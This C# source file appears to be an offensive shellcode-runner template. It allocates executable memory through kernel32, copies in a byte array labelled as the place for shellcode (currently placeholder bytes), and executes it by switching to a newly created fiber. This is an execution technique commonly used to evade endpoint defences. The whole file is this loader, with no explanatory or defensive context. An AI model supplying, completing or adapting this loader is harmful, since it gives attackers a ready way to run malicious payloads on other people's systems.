using System;
using System.Runtime.InteropServices;
using System.Text;
public class FiberTest
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, uint lpParameter);
    [DllImport("kernel32.dll")]
    public static extern IntPtr ConvertThreadToFiber();
    [DllImport("kernel32.dll")]
    public extern static IntPtr SwitchToFiber(IntPtr fiberAddress);

    static void Main(string[] args)
    {
        //Shellcode Here C# Format 
        byte[] buf = new byte[] {0xde,0xad,0xbe,0xef};
        int size = buf.Length;
        IntPtr fiberAddr = ConvertThreadToFiber();
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)size, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)size, 0x40, out oldProtect);
        IntPtr fiber = CreateFiber(0, addr, 0);
        SwitchToFiber(fiber);
        SwitchToFiber(fiberAddr);
    }
}


